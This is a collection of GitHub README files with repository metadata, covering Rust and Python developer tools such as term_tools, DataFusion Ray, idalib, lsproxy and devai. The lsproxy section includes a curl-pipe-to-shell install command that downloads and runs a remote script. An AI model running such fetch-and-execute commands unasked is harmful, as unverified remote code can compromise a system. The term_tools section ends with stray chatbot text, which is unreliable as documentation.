- [x] Support boolean parameter type
- [x] Support password parameter type
- [x] Auto-detect current directory's git branch
- [x] Remember last selected project and build parameters
- [x] i18n support (fluent)
- [x] Automatically check for updates

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
",13,0,2,MIT,"ci.yml,release.yml",2.0
Syaw0/term_tools,develop,"# **term_tools: Rich API for Colorizing Terminal**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) [![Version](https://img.shields.io/badge/dynamic/toml?url=https%3A%2F%2Fraw.githubusercontent.com%2FSyaw0%2Fterm_tools%2Frefs%2Fheads%2Fdevelop%2FCargo.toml&query=package.version&label=Version&color=red)](https://crates.io/term_tools)

## **Overview**

term_tools is a Rust library that provides a rich API for colorizing terminal output. It allows you to create styled text strings with various colors, effects, and formatters.

## **Features**

- **Colors**: Supports 16 basic colors, 256 palette colors, and RGB colors.
- **Effects**: Supports slow blink and rapid blink.
- **Formatters**: Supports reset, bold, faint, italic, underline, and overline formatters.
- **Easy to use**: Simple and intuitive API for creating styled text strings.

## **Usage**

To use term_tools, simply add the following line to your `Cargo.toml` file:

```toml
[dependencies]
term_tools = ""0.1.0""
```

Then, import the library in your Rust code:

```rust
use term_tools::styled;
```

Create a styled text string using the `styled` function:

```rust
let styled_text = styled(""Hello, World!"")
    .red()
    .bold()
    .underline()
    .paint();
println!(""{}"", styled_text);
```

## **Sequence of Styles**

The sequence of styles is important when using the `fg` and `bg` methods. These methods set the foreground and background colors, respectively, for all subsequent styles.

When you call `fg` or `bg`, all styles that come before it will be applied to the foreground or background, respectively.

Here's an example:

```rust
let styled_text = styled(""Hello, World!"")
    .red() // applies to foreground
    .fg() // sets foreground color to red
    .blue() // applies to background
    .bg() // sets background color to blue
    .paint();
```

In this example, the `red` style is applied to the foreground, and the `blue` style is applied to the background.

if there is only one call of `fg` or `bg` whole colors applied that `PaintType` for example:

```rust
let styled_text = styled(""Hello, World!"")
    .red() // red color
    .blue() // blue color
    .bg() // apply background color
    .magenta() // magenta color
    .paint();
```

in this example `paint` method will apply the background color of all colors.

if there is not any `fg` or `bg` call , the default paint type assume as `Foreground` for example:

```rust
let styled_text = styled(""Hello, World!"")
    .red() // red color
    .blue() // blue color
    .paint();
```

in this example the `paint` method will use foreground color of the colors.

## **Examples**

Here are some examples of using term_tools:

- **Basic colors**:

```rust
let styled_text = styled(""Hello, World!"")
    .red()
    .paint();
println!(""{}"", styled_text);
```

- **RGB colors**:

```rust
let styled_text = styled(""Hello, World!"")
    .rgb(255, 0, 0)
    .paint();
println!(""{}"", styled_text);
```

- **Effects**:

```rust
let styled_text = styled(""Hello, World!"")
    .bold()
    .underline()
    .paint();
println!(""{}"", styled_text);
```

- **Formatters**:

```rust
let styled_text = styled(""Hello, World!"")
    .reset()
    .bold()
    .paint();
println!(""{}"", styled_text);
```

## **License**

term_tools is licensed under the MIT License.

## **Contributing**

Contributions are welcome If you'd like to contribute to term_tools, please fork the repository and submit a pull request.

I hope this helps Let me know if you'd like me to make any changes.
",1,5,2,MIT,rust.yml,2.0
crema-labs/sxg-sp1,main,"# Verifiable Web Proofs using SXG's

Signed HTTP Exchanges (SXG) is draft specification that allows web content to be signed and verified. This project is a proof of concept that demonstrates how SXG's can be used to verify the integrity and authenticity of web content using zero-knowledge proofs.

## Does all website have sxg enabled?

No, not all websites have SXG enabled. It would be great if all websites supported SXG. But it will on click on cloudflare to enable so, it would be great if all websites supported SXG to enable it.

## How can we enable it?

Literally only cloudflare can enable it with one click. So then cloudflare will sign the content and then we can verify it using the zero-knowledge proof.

## How can I check if a website supports SXG?

Currently, only a few websites support SXG.

Some of the websites that support SXG are:

1. [vivs.wiki](https://vivs.wiki/blog/SXG)
2. [crema.sh](https://crema.sh/)

You can use these extension to verify whether sxg is enabled or not.
<img width=""1125"" alt=""Screenshot 2024-10-17 at 6 27 07‚ÄØPM"" src=""https://github.com/user-attachments/assets/cc4a9ee2-bf61-4b9a-9108-8cec5b7811b9"">

If you want to learn more about sxg you can visit [here](https://web.dev/signed-exchanges/)

Verify the integrity and authenticity of web content using Signed HTTP Exchanges (SXG) and zero-knowledge proofs.

This Project contains:

1. sp1 circuit for verify sxg
2. smart contract to verify the proof on chain

Deployed contract: [0xadf974bae8d9de2a007058dfbb557097627a1a18](https://sepolia.etherscan.io/address/0xadf974bae8d9de2a007058dfbb557097627a1a18#readContract)

This is a template for creating an end-to-end [SP1](https://github.com/succinctlabs/sp1) project that can generate a proof of any RISC-V program.

## Requirements

- [Rust](https://rustup.rs/)
- [SP1](https://docs.succinct.xyz/getting-started/install.html)

## Usage

1. Use Sxg Extension to generate inputs for sxg content you wanted to prove from https://github.com/crema-labs/sxg-extension
![image](https://github.com/user-attachments/assets/f0bd451d-e317-4274-8175-5992f5ecca56)

In case you wanted to generate proof and verify:

```bash
RUST_LOG=info cargo run --release --bin evm -- --system groth16 --input-file-id <sxg-input>
```

2. Smart Contract Verification

We've also developed a smart contract to verify the proofs generated by our SP1 circuit. This allows for on-chain verification of web content integrity and authenticity.

To interact with the contract or view its details, check out our deployed contract on Etherscan:
[0xadf974bae8d9de2a007058dfbb557097627a1a18](https://sepolia.etherscan.io/address/0xadf974bae8d9de2a007058dfbb557097627a1a18#readContract)
",0,0,6,MIT,"foundry-test.yml,prove.yml",3.0
swlkr/static_sqlite,main,"# static_sqlite

An easy way to map sql to rust functions and structs

# Quickstart

```rust
use static_sqlite::{sql, Result, self};

sql! {
    let migrate = r#""
        create table User (
            id integer primary key,
            name text unique not null
        );

        alter table User
        add column created_at integer;

        alter table User
        drop column created_at;
    ""#;

    let insert_user = r#""
        insert into User (name)
        values (?)
        returning *
    ""#;
}

#[tokio::main]
async fn main() -> Result<()> {
    let db = static_sqlite::open(""db.sqlite3"").await?;
    let _ = migrate(&db).await?;
    let user = insert_user(&db, ""swlkr"").await?;

    assert_eq!(user.id, 1);
    assert_eq!(user.name, ""swlkr"");

    Ok(())
}
```

# Use

```sh
cargo add --git https://github.com/swlkr/static_sqlite
```

# Treesitter

```
((macro_invocation
   macro:
     [
       (scoped_identifier
         name: (_) @_macro_name)
       (identifier) @_macro_name
     ]
   (token_tree
     (identifier)
     (raw_string_literal
       (string_content) @injection.content)))
 (#eq? @_macro_name ""sql"")
 (#set! injection.language ""sql"")
 (#set! injection.include-children))
```

Happy hacking!
",0,0,2,,,1.0
Liubsyy/VisualClassBytes,master,"## VisualClassBytes

IDEA plugin for Java class bytecode editor, based on
ASM and BCEL.


## Features
- Modify info of class, field, inner class and method.
- Edit method bytecode instructions, local variable table, exception table, and line number table.
- Modify constant pool.
- Support class file and class in JAR.


## Quick start

### 1. Install plugin from marketplace
First install the plugin JarEditor from marketplace, IDEA at least version **2020.3**

### 2. Open VisualClassBytes Editor 

Right click on class file -> Visual ClassBytes, you can open VisualClassBytes editor.

<img src=""./img/vcb_main.png"" width=""800"" height=""600"" />


### 3. Modify info

Then you can modify class ,field,inner class and method info etc.

<img src=""./img/edit_info.png"" width=""800"" height=""650"" />

### 4. Edit method bytecode instructions

Open the method node to modify the bytecode instructions.
<img src=""./img/edit_method.png"" width=""800"" height=""572"" />

You can also modify local variable,exception table,line number and etc.

### 5. Modify constant pool

Open the constant pool node to modify constant.

<img src=""./img/const_pool.png"" width=""600"" height=""488"" />
",1,0,1,Apache-2.0,,0.0
apache/datafusion-ray,main,"<!---
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  ""License""); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
-->

# DataFusion on Ray

> This was originally a research project donated from [ray-sql] to evaluate performing distributed SQL queries from 
> Python, using [Ray] and [Apache DataFusion]

[ray-sql]: https://github.com/datafusion-contrib/ray-sql

DataFusion Ray is a distributed Python DataFrame and SQL query engine powered by the Rust implementation 
of [Apache Arrow], [Apache DataFusion], and [Ray].

[Ray]: https://www.ray.io/
[Apache Arrow]: https://arrow.apache.org/
[Apache DataFusion]: https://datafusion.apache.org/

## Comparison to other DataFusion projects

### Comparison to DataFusion Ballista

- Unlike [DataFusion Ballista], DataFusion Ray does not provide its own distributed scheduler and instead relies on 
  Ray for this functionality. As a result of this design choice, DataFusion Ray is a much smaller and simpler project.
- DataFusion Ray is Python-first, and DataFusion Ballista is Rust-first

[DataFusion Ballista]: https://github.com/apache/datafusion-ballista

### Comparison to DataFusion Python

- [DataFusion Python] provides a Python DataFrame and SQL API for in-process execution. DataFusion Ray extends 
  DataFusion Python to provide scalability across multiple nodes.

[DataFusion Python]: https://github.com/apache/datafusion-python

## Example

Run the following example live in your browser using a Google Colab [notebook](https://colab.research.google.com/drive/1tmSX0Lu6UFh58_-DBUVoyYx6BoXHOszP?usp=sharing).

```python
import os
import ray

from datafusion_ray import DatafusionRayContext

SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))

# Start a local cluster
ray.init(resources={""worker"": 1})

# Create a context and register a table
ctx = DatafusionRayContext(2)
# Register either a CSV or Parquet file
# ctx.register_csv(""tips"", f""{SCRIPT_DIR}/tips.csv"", True)
ctx.register_parquet(""tips"", f""{SCRIPT_DIR}/tips.parquet"")

result_set = ctx.sql(
  ""select sex, smoker, avg(tip/total_bill) as tip_pct from tips group by sex, smoker""
)
for record_batch in result_set:
  print(record_batch.to_pandas())
```

## Status

- DataFusion Ray can run all queries in the TPC-H benchmark

## Features

- Mature SQL support (CTEs, joins, subqueries, etc) thanks to DataFusion
- Support for CSV and Parquet files

## Building

```bash
# prepare development environment (used to build wheel / install in development)
python3 -m venv venv
# activate the venv
source venv/bin/activate
# update pip itself if necessary
python -m pip install -U pip
# install dependencies (for Python 3.8+)
python -m pip install -r requirements-in.txt
```

Whenever rust code changes (your changes or via `git pull`):

```bash
# make sure you activate the venv using ""source venv/bin/activate"" first
maturin develop; python -m pytest 
```

## Testing

Running local Rust tests require generating the tpch-data. This can be done
by running the following commands:

```bash
export TPCH_TEST_PARTITIONS=1
export TPCH_SCALING_FACTOR=1
./scripts/gen-test-data.sh
```

This will generate data into a top-level `data` directory.

Tests can be run with:

```shell
export TPCH_DATA_PATH=`pwd`/data
cargo test
```

## Benchmarking

Create a release build when running benchmarks, then use pip to install the wheel.

```bash
maturin develop --release
```

## How to update dependencies

To change test dependencies, change the `requirements.in` and run

```bash
# install pip-tools (this can be done only once), also consider running in venv
python -m pip install pip-tools
python -m piptools compile --generate-hashes -o requirements-310.txt
```

To update dependencies, run with `-U`

```bash
python -m piptools compile -U --generate-hashes -o requirements-310.txt
```

More details [here](https://github.com/jazzband/pip-tools)
",0,8,1,Apache-2.0,"k8s.yml,rust.yml",30.0
binarly-io/idalib,master,"# idalib

[![crates.io](https://img.shields.io/crates/v/idalib)](https://crates.io/crates/idalib)
[![documentation](https://img.shields.io/badge/documentation-0.2.2%2B9.0.240925-blue?link=https%3A%2F%2Fbinarly-io.github.io%2Fidalib%2Fidalib)](https://binarly-io.github.io/idalib/idalib/)
[![license](https://img.shields.io/crates/l/idalib)](https://github.com/binarly-io/idalib)
[![crates.io downloads](https://img.shields.io/crates/d/idalib)](https://crates.io/crates/idalib)

Idiomatic Rust bindings for the IDA SDK, enabling the development of standalone
analysis tools using IDA v9.0‚Äôs idalib.

## IDA support and dependencies

The bindings and examples have been tested against IDA Pro v9.0 on Windows
(11), Linux (Ubuntu 24.04 LTS), and macOS Sequoia (Apple Silicon).

In addition to the latest v9.0 IDA SDK and IDA itself, a recent version of
LLVM/Clang is required (this is to help generate bindings from the SDK), it can
be obtained from, e.g., [here](https://github.com/llvm/llvm-project/releases).

## Developing with idalib

For development, only the IDA SDK is required, whereas to run tests, an IDA
installation (with a valid license) is required. During build, the crates
locate the SDK and IDA installation using the following environment variables:

- `IDASDKDIR` set to the IDA Pro v9.0 SDK
- `IDADIR` (optional) set to the directory containing the `ida` executable
  (e.g., `/Applications/IDA Professional v9.0/Contents/macOS` for macOS, or
  `$HOME/ida-pro-9.0` for Linux). If not set, the build script will check
  common locations.

### Projects using idalib

- [xorpse/idalib-mp](https://github.com/xorpse/idalib-mp): example project demonstrating idalib + multi-processing.
- [xorpse/parascope](https://github.com/xorpse/parascope): mass-scan source/decompiled code using weggli rulesets.
- [0xdea/rhabdomancer](https://github.com/0xdea/rhabdomancer): locate calls to insecure API functions in a binary file.
- [0xdea/haruspex](https://github.com/0xdea/haruspex): extract pseudo-code from the IDA Hex-Rays decompiler.

### Examples

A minimal project to working with `idalib` requires the following components:

`Cargo.toml`:

```toml
name = ""example-analyser""

# ...

[dependencies]
idalib = ""0.2""

[build-dependencies]
idalib-build = ""0.2""
```

`build.rs`:

```rust
fn main() -> Result<(), Box<dyn std::error::Error>> {
    idalib_build::configure_linkage()?;
    Ok(())
}
```

`src/main.rs`:

```rust
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let idb = idalib::IDB::open(""/path/to/binary"")?;

    // ...

    Ok(())
}
```

More comprehensive examples can be found in `idalib/examples`. To run them:

Linux/macOS:

```sh
export IDASDKDIR=...
export IDADIR=...

cargo run --example=dump_ls
```

Windows:

```powershell
$env:PATH=""C:\Program Files\IDA Professional 9.0;$env:PATH""
$env:IDADIR=""C:\Program Files\IDA Professional 9.0""
$env:IDASDKDIR=...

cargo run --example=dump_ls
```

### Linking

The `idalib-build` crate provides various build script helpers to simplify
linking:

- `idalib_build::configure_idalib_linkage`: links against `(lib)ida` and
  `(lib)idalib` in the IDA installation directory.
- `idalib_build::configure_idasdk_linkage`: links against the `(lib)ida` and
  `(lib)idalib` stub libraries bundled with the SDK.
- `idalib_build::configure_linkage`: links against the `(lib)ida` and
  `(lib)idalib` stub libraries and for Linux/macOS sets the RPATH to refer to
  the detected (or specified via `IDADIR`) installation directory.

## Extending idalib

To expose unimplemented IDA SDK functionality, modify the `idasdk-sys` crate,
add appropriate high-level wrappers in `idalib`, and submit a pull request.
Ensure that the additions are portable and build with the latest SDK. We won't
accept PRs to support older beta releases.

## Contributors

Please see [CONTRIBUTORS.md](https://github.com/binarly-io/idalib/blob/master/CONTRIBUTORS.md) for a full list of acknowledgments.
",0,0,2,,"build.yml,document.yml",19.0
Brooooooklyn/network-change,main,"# `@napi-rs/network-change`

![https://github.com/Brooooooklyn/network-change/actions](https://github.com/Brooooooklyn/network-change/workflows/CI/badge.svg)

**Observe network change event in Node.js.**

> [!IMPORTANT]
> This package is working in progress, and only support Windows and macOS now.

## Install

```
yarn add @napi-rs/network-change
```

```
pnpm add @napi-rs/network-change
```

## Usage

```typescript
import { NwPathMonitor } from '@napi-rs/network-change';


const monitor = new NwPathMonitor();
monitor.start((path) => {
  console.log('network change', path);
});
```
",0,1,2,MIT,CI.yml,3.0
agentic-labs/lsproxy,main,"<div align=""center"">
<a href=""https://agenticlabs.com/""><img src=""https://raw.githubusercontent.com/agentic-labs/.github/main/assets/logo.png"" alt=""Agentic Labs"" title=""Agentic Labs"" align=""center"" height=""150px"" /></a>

# lsproxy - Precise code navigation via an API
<p align=""center"">
  <a href=""https://discord.gg/EUFGjSawyk""a><img alt=""discord"" src=""https://img.shields.io/discord/1296271531994775552"" /></a>
  <img alt=""license"" src=""https://img.shields.io/github/license/agentic-labs/lsproxy"" />
  <a href=""https://pypi.org/project/lsproxy-sdk/"" a><img alt=""pypi"" src=""https://img.shields.io/pypi/v/lsproxy-sdk"" /></a>
</p>
</div>


   
## <a name=""what-is-lsproxy"">What is lsproxy?</a>

`lsproxy` offers IDE-like code analysis and navigation functionality in a docker container with a REST API.

It supports [multiple languages](#supported-languages) and resolves relationships between code symbols (functions, classes, variables) anywhere in the project - which can be used to help AI assistants navigate a codebase or build custom code RAG systems.

`lsproxy` runs [Language Servers](https://microsoft.github.io/language-server-protocol/) and [ast-grep](https://github.com/ast-grep/ast-grep) under the hood, giving you precise search results without the headache of configuring and integrating language-specific tooling.

[![](https://mermaid.ink/img/pako:eNptUtFumzAU_RV0q0qdRKpAgAAPk6buZVInTau0h9ZV5YRrYhVsZJuuLMq_7xraNLQ1D9jnnHt8ru09bHWFUIJo9N_tjhsXXP9miqmAhqfuLhhc0X_DLTL4cu-5ibX9pja825FMOS4VmjsGje2Mfh4Y3E8iP55007ej0Z9xNtm8slRBdddc1T2vMbhB84TGzgx4TQpu3aI22M2ZThL17dePTzYMFouv3v1TnNezBBPWydM95xiq6tj40D5I9SBkg75jaZ2HNrqxgVSBh49pKhSWNEKq6kXjIamkk1odVeajiiA0qLY4ncTpjVCugMFP3SvHYAw59TUpKPCInYScEz7SHDEjMmHn54F1Q4Nvl-obasozzMRKiNA6ox-xPEt4scT4Xc1O01FMcpH6771nI1E5-yYRIoUQWjQtlxU9wr0vYOB26F9JSdOKm0cGTB1Ix3unbwa1hdKZHkPou4o7_C45PcMWSsEbS2jH1a3W7auIllDu4RnKJLtM0yJL82hdJKs4zUIYoIyj5WWeJlGyzKNslefr5BDCv9GAiCKOi6yIlnGeFkmxPvwHnPP5bQ?type=png)](https://mermaid.live/edit#pako:eNptUtFumzAU_RV0q0qdRKpAgAAPk6buZVInTau0h9ZV5YRrYhVsZJuuLMq_7xraNLQ1D9jnnHt8ru09bHWFUIJo9N_tjhsXXP9miqmAhqfuLhhc0X_DLTL4cu-5ibX9pja825FMOS4VmjsGje2Mfh4Y3E8iP55007ej0Z9xNtm8slRBdddc1T2vMbhB84TGzgx4TQpu3aI22M2ZThL17dePTzYMFouv3v1TnNezBBPWydM95xiq6tj40D5I9SBkg75jaZ2HNrqxgVSBh49pKhSWNEKq6kXjIamkk1odVeajiiA0qLY4ncTpjVCugMFP3SvHYAw59TUpKPCInYScEz7SHDEjMmHn54F1Q4Nvl-obasozzMRKiNA6ox-xPEt4scT4Xc1O01FMcpH6771nI1E5-yYRIoUQWjQtlxU9wr0vYOB26F9JSdOKm0cGTB1Ix3unbwa1hdKZHkPou4o7_C45PcMWSsEbS2jH1a3W7auIllDu4RnKJLtM0yJL82hdJKs4zUIYoIyj5WWeJlGyzKNslefr5BDCv9GAiCKOi6yIlnGeFkmxPvwHnPP5bQ)

## Key Features

- üéØ **Precise Cross-File Code Navigation**: Find symbol definitions and references across your entire project.
- üåê **Unified API**: Access multiple language servers through a single API.
- üõ†Ô∏è **Auto-Configuration**: Automatically detect and configure language servers based on your project files.
- üìä **Code Diagnostics**: (Coming Soon) Get language-specific lint output from an endpoint.
- üå≥ **Call & Type Hierarchies**: (Coming Soon) Query multi-hop code relationships computed by the language servers.
- üîÑ **Procedural Refactoring**: (Coming Soon) Perform symbol operations like `rename`, `extract`, `auto import` through the API.
- üß© **SDKs**: Libraries to get started calling `lsproxy` in popular languages.
    

## <a name=""getting-started"">Getting started</a>
The easiest way to get started is to run our tutorial! Check it out at [demo.lsproxy.dev](https://demo.lsproxy.dev)
It's also super easy to run `lsproxy` on your code! We keep the latest version up to date on Docker Hub, and we have a Python SDK available via `pip.`

### Install the sdk

```bash
pip install lsproxy-sdk
```
You can find the source for the SDK [here](https://github.com/agentic-labs/lsproxy-python-sdk)

### Run a container or add to compose
Make sure your `WORKSPACE_PATH` is an absolute path, otherwise docker will complain.
```bash
docker run -p 4444:4444 -v $WORKSPACE_PATH:/mnt/workspace agenticlabs/lsproxy
```

```dockerfile
services:
  lsproxy:
    image: agenticlabs/lsproxy
    ports:
      - ""4444:4444""
    volumes:
      - ${WORKSPACE_PATH}:/mnt/workspace
```
### Configure an existing system
You can also configure an existing system to run `lsproxy`. Add the following line in your dockerfile or run it as part of a startup script
```bash
curl -sSL https://github.com/agentic-labs/lsproxy/releases/latest/download/install-lsproxy.sh | sh
```

### Explore your workspace!

```python
from lsproxy import Lsproxy

client = Lsproxy()
file_path = ""relative/path/from/project/root.cpp""
symbols = client.definitions_in_file(file_path)
for symbol in symbols:
    print(f""{symbol.name} is defined in {file_path}"")
```

## <a name=""contributing"">Building products with lsproxy</a>

If you're building AI coding agents or code RAG, or would like to use `lsproxy` in a commercial product, please reach out!

## <a name=""contributing"">Contributing</a>

We appreciate all contributions! You don't need to be an expert to help out.
Please see [CONTRIBUTING.md](https://github.com/agentic-labs/lsproxy/blob/main/CONTRIBUTING.md) for more details on how to get
started.

> Questions? Reach out to us [on Discord](https://discord.gg/WafeS3jN).

## <a name=""community"">Community</a>

We're building a community. Come hang out with us!

- üåü [Star us on GitHub](https://github.com/agentic-labs/lsproxy)
- üí¨ [Chat with us on Discord](https://discord.gg/EUFGjSawyk)
- ‚úèÔ∏è [Start a GitHub Discussion](https://github.com/agentic-labs/lsproxy/discussions)
- üê¶ [Follow us on Twitter](https://twitter.com/agentic_labs)
- üï¥Ô∏è [Follow us on LinkedIn](https://www.linkedin.com/company/agentic-labs)
  
## <a name=""supported-languages"">Supported languages</a>

We're looking to add new language support or better language servers so let us know what you need!
|Language|Server|URL|
|:-|:-|:-|
|Javascript|`typescript-language-server`|https://github.com/typescript-language-server/typescript-language-server|
|Python|`jedi-language-server`|https://github.com/pappasam/jedi-language-server|
|Rust|`rust-analyzer`|https://github.com/rust-lang/rust-analyzer|
|Typescript|`typescript-language-server`|https://github.com/typescript-language-server/typescript-language-server|
|C/C++ (pending release)|`clangd`|https://clangd.llvm.org/|
|Java (pending release)|`jdtls`|https://github.com/eclipse-jdtls/eclipse.jdt.ls|
|Your Favorite Language | Awesome Language Server | https://github.com/agentic-labs/lsproxy/issues/new |
",2,13,23,AGPL-3.0,"image_upload.yml,mintlify_update.yml,tests.yml",62.0
xmtp/diesel-wasm-sqlite,main,"# Diesel Backend for SQLite and WASM

Use SQLite with Diesel ORM in your web apps!

## Quickstart

Add `diesel-wasm-sqlite` to your project. SQLite is automatically bundled with
the library.

```toml
[dependencies]
diesel = { version = ""2.2"" }
diesel-wasm-sqlite = { git = ""https://github.com/xmtp/libxmtp"", branch = ""wasm-backend"" }
wasm-bindgen = ""0.2""
```

```rust
use diesel_wasm_sqlite::{connection::WasmSqliteConnection, WasmSqlite};
use wasm_bindgen::prelude::*;

pub const MIGRATIONS: EmbeddedMigrations = embed_migrations!(""./tests/web/migrations/"");

mod schema {
    diesel::table! {
        books {
            id -> Integer,
            title -> Text,
            author -> Nullable<Text>,
        }
    }
}


#[derive(Deserialize, Insertable, Debug, PartialEq, Clone)]
#[diesel(table_name = books)]
pub struct BookForm {
    title: String,
    author: Option<String>,
}

// SQLite must be instantiated in a web-worker
// to take advantage of OPFS
#[wasm_bindgen]
async fn code_in_web_worker() -> Result<i32, diesel::QueryResult<usize>> {
    use schema::books::dsl::*;
    // `init_sqlite` sets up OPFS and SQLite. It must be ran before anything else, 
    // or we crash once we start trying to do queries.
    diesel_wasm_sqlite::init_sqlite().await;

    // create a new persistent SQLite database with OPFS
    let result = WasmSqliteConnection::establish(&format!(""test-{}"", rng));
    let query = insert_into(books).values(vec![
        BookForm {
                title: ""Game of Thrones"".into(),
                author: Some(""George R.R"".into()),
            },
            BookForm {
                title: ""The Hobbit"".into(),
                author: Some(""J.R.R. Tolkien"".into()),
            },
    ]);
    Ok(query.execute(conn)?)
}
```

Look in `tests/test/web.rs` for a working example!

## Contributing

### Building

#### Install yarn dependencies

`yarn`

#### Build the SQLite/OPFS JavaScript Bundle

`yarn build`

#### Build the rust code

`cargo build --target wasm32-unknown-unknown`

#### Run tests (browser)

- `yarn test:chrome`
- `yarn test:firefox`
- `yarn test:safari`

Navigate to `http://localhost:8000` to observe test output.

#### Run tests (headless)

- `yarn test:chrome:headless`
- `yarn test:firefox:headless`
- `yarn test:safari:headless`

### Opening a Pull Request

PR Title should follow
[conventional commits format](https://www.conventionalcommits.org/en/v1.0.0/)

In short, if should be one of:

- `fix:` represents bug fixes, and results in a SemVer patch bump.
- `feat:` represents a new feature, and results in a SemVer minor bump.
- `<prefix>!:` (e.g. feat!:): represents a **breaking change** (indicated by the
  !) and results in a SemVer major bump.
- `doc:` documentation changes
- `perf:` changes related to performance
- `refactor:` a refactor
- `style:`
- `test:`

You can add extra context to conventional commits by using parantheses, for
instance if a PR touched only database-related code, a PR title may be:

- `feat(db): Add SQLCipher plaintext_header support to database connection`
",0,4,7,MIT,"lint-pr.yml,release-plz.yml,test.yml",10.0
jeremychone/rust-devai,main,"<div align=""center"">

<a href=""https://crates.io/crates/devai""><img src=""https://img.shields.io/crates/v/devai.svg"" /></a>
<a href=""https://github.com/jeremychone/rust-devai""><img alt=""Static Badge"" src=""https://img.shields.io/badge/GitHub-Repo?color=%23336699""></a>
<a href=""https://www.youtube.com/watch?v=DSuvkCHdD5I&list=PL7r-PXl6ZPcBcLsBdBABOFUuLziNyigqj""><img alt=""Static Badge"" src=""https://img.shields.io/badge/YouTube_devai_Intro-Video?style=flat&logo=youtube&color=%23ff0000""></a>

</div>

# IMPORTANT - Now v0.5.0-WIP with Lua

The main branch is no `v0.5.0-WIP` (Work in progress), a huge upgrade from the currently released `0.1.0`, and now uses **Lua** for scripting (rather than Rhai).

 _Rhai is great, but Lua is more known, very small, efficient, supports async, and is perfect fit for the embedding needs of devai_

# **devai** - **Command Agent File Runner**

```sh
# Install
cargo install devai

# Init (optional; will be executed on each run as well)
devai init

# Will proof-read and update of the direct .md file from the current direct
devai run proof-read -f ""./*.md""
# Can use multiple globs or direct file -f ""./*.md"" -f ""./doc/**/*.md""

# How it works: 
#   It will run the installed Command Agent file "".devai/defaults/proof-read.devai"" on all source files matching ""./src/m*.rs""

# IMPORTANT: Make sure everything is committed before usage.
```

**TOP COLLABORATOR** Big **thanks** to [Stephan Philipakis](https://github.com/sphilipakis), a top **devai** collaborator contributing to the next-generation methodology for production coding with GenAI.

## KEY CONCEPT - **ONE Markdown** == **ONE Agent**

The main goal of devai is to minimize the friction of creating and running an agent while giving maximum control over how we want those agents to run, and maximizing iteration speed to mature them quickly.

In one of its simplest forms, there are 3 main stages:

```sh
# Run the ./first-agent.devai on all files ending matching ""**/*.md""
devai run ./my-agents/first-agent.devai -f ""./README.md""
```

`./my-agents/my-first-agent.devai`
``````md
# Data 

```lua
-- Here, there will be some script to run before each instruction
-- Get access to `input` and can fetch more data and return it for the next stage
-- Input is what was given by the command line (when -f, this will be the file metadata)

return {
    file: utils.file.load(input.path)
}
```

# Instruction

This is a handlebars section where we can include the data generated above. For example, 

Here is the content of the file to proofread

```{{input.ext}}
{{data.file.content}}
```

- Correct the English of the content above. 
- Do not modify it if it is grammatically correct. 

# Output

```lua

-- Here, we can take the ai_response.content, and do some final processing. 
-- For example: 
-- Here, we remove the eventual top markdown block. In certain cases, this might be useful. 
local content = utils.md.outer_block_content_or_raw(ai_response.content);
-- For code, it is nice to make sure it ends with one and only one new line. 
content = utils.text.ensure_single_ending_newline(content)
-- More processing....

-- input.path is the same as data.file.path, so we can use either
utils.file.save(input.path, content)

return ""This will be printed in the terminal if String""

```

``````

See [Complete Stages Description](#complete-stages-description) for more details

## More Details

Supports all models/providers supported by the [genai crate](https://crates.io/crates/genai) (see below for more information).

You can customize the model and concurrency in `.devai/config.toml`.

**v0.1.1 Note:** New `.devai/` file structure with the new `.devai` file extension. See [.devai/ folder structure](#devai-folder-structure).

**IMPORTANT**: In VSCode or your editor, map the `*.devai` extension to `markdown` to benefit from markdown highlighting. Devai agent files are markdown files.

**IMPORTANT**: Make sure to run this command line when everything is committed so that overwritten files can be reverted easily.

_P.S. If possible, please refrain from publishing `devai-custom` type crates on crates.io, as this might be more confusing than helpful. However, feel free to fork and code as you wish._

### API Keys

**devai** uses the [genai crate](https://crates.io/crates/genai), and therefore, the simplest way to provide the API keys for each provider is via environment variables in the terminal when running devai.

Here are the environment variable names used:

```
OPENAI_API_KEY
ANTHROPIC_API_KEY
MODEL_GEMINI
GEMINI_API_KEY
GROQ_API_KEY
COHERE_API_KEY
```

On Mac, this CLI uses the Mac keychain to store the key value if it is not available in the environment variable. This will be extended to other OSes as it becomes more robust. 

## Complete Stages Description

In fact, there are 2 more stages to fully control the agent flow, and that is the `Before All` and `After All` stages. 

Here is a full description of the complete flow

- First, an agent receives zero or more inputs. 
    - Inputs can be given through the command line via: 
        - `-i` or `--input` to specify one input (can add multiple `-i/--input`)
        - `-f some_glob` will create one input per file matched with input as `{path, name, step, ext}`
    - Then the following stages happen (all optional)
- **Stage 1**: `# Before All` (lua block) (optional) 
    - The `lua` block has the following scope
        - `inputs` which is all of the inputs
    - Then can return
        - Nothing
        - Some data that will be available as `before_all` in the next stages.
            - e.g., `return #{""some"": ""data""}`
        - Override or generate inputs via 
            `return devai::before_all_response(#{inputs: [1, 2, 3]})`
        - or both by passing `#{inputs: ..., before_all: ...}` to the `devai::before_all_response` argument. 
- **Stage 2**: `# Data` (lua block) (optional)
    - The `lua` block gets the following variable in scope: 
        - `input` from the command line and/or Before All section (or null if no input)
    - Can return some data that will be labeled `data` in the future stage and can be used in the next steps. 
- **Stage 3**: `# Instruction` (handlebars template)
    - The content of the instruction is rendered via Handlebars, which is a templating engine, with the following variables in scope
        - `input` from Stage 1 or command line
        - `data` from Stage 2 (or null if no stage 2 or Stage 2 returns void/null/nothing)
- **Stage 4**: `# Output` (lua block) (optional)
    - The `lua` block will get the following scope
        - `input` from Stage 1 or command line (or null if no input)
        - `data` from Stage 2 (or null if no Stage 2 or Stage 2 returns void/null/nothing)
        - `ai_response` (if instruction) with 
            - `.content` the text content of the response
            - `.model_name` the model name it was executed with
    - Can return some data, which will be put in the `output` scope for the following stages
- **Stage 5**: `After All` (lua block) (optional)
    - The `lua` block will get the following scope
